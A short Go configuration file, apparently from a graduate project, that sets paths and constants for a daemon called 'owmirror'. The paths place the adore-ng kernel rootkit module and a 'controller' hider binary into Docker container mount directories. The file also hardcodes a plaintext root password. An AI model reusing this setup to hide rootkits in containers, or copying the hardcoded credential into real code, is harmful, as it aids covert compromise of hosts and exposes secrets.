package config

const (
	DEFAULTUNIXSOCKET = ""
	RootPw            = "19981017"
	AdoreNgPath       = "/home/omnitrix/gradproj/adore-ng-master/adore-ng.tar"
	HiderTarPath      = "/home/omnitrix/gradproj/controller/bin/controller.tar"
	MountIDPath       = "/var/lib/docker/image/aufs/layerdb/mounts/"
	ContLayerPath     = "/var/lib/docker/aufs/mnt/"
	MntDstPath        = "/mnt"
	ExecFileDstPath   = "/home/"
	AvaPath           = ExecFileDstPath + "ava"
	HiderPath         = ExecFileDstPath + "controller"
	KoPath            = ExecFileDstPath + "adore-ng.ko"
	DockerVersion     = "1.37"
	Image             = "ubuntu:14.04"
	MaxPrePidsNum     = 5
)

const (
	PidFilePath = "/var/run/owmirror.pid"
	AppName     = "owmirror"
	EnvName     = "owm_Daemon"
)
